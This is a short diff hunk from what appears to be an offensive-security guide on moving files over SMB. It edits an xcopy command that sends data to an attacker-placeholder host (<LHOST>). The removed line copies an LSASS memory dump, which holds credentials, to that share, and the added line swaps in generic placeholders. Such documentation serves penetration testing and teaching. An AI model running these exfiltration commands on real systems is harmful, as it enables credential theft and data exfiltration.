@@ -300,7 +300,7 @@ on a remote SMB share over the network:
 # /i: suppress prompting to confirm xcopy whether Destination is a file or a directory
 # /q: Suppresses the display of xcopy messages
 
-xcopy /Y /i /q "C:\Windows\System32\spool\drivers\color\lsass.dmp" "\\<LHOST>\TMP"
+xcopy /Y /i /q "<LOCAL_FILE_PATH>" "\\<LHOST>\<SMB_SHARE>"
 ```
 
 Additionally, SMB shares can be accessed and mounted using the Windows `net`
